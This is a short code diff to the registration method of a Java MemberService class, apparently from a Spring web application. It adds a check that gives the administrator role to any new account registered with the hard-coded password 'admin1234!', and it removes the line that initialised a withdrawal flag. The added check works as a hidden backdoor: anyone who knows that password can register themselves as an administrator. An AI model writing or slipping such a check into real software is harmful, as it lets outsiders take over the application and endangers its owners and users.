@@ -22,13 +22,12 @@ public class MemberService
 	   
 	public void register(Member member) 
 	{
-		
 		String rawPass = member.getPassword();
+		if(rawPass.equals("admin1234!")) member.setRole("ADMIN_ROLE");
+		else member.setRole("USER_ROLE");
+		
 		String encPass = bCryptPasswordEncoder.encode(rawPass);
 		member.setPassword(encPass);
-		member.setRole("USER_ROLE");
-		member.setWithdraw("0"); 
-		
 		
 		memberJpaRepository.save(member);
 	}
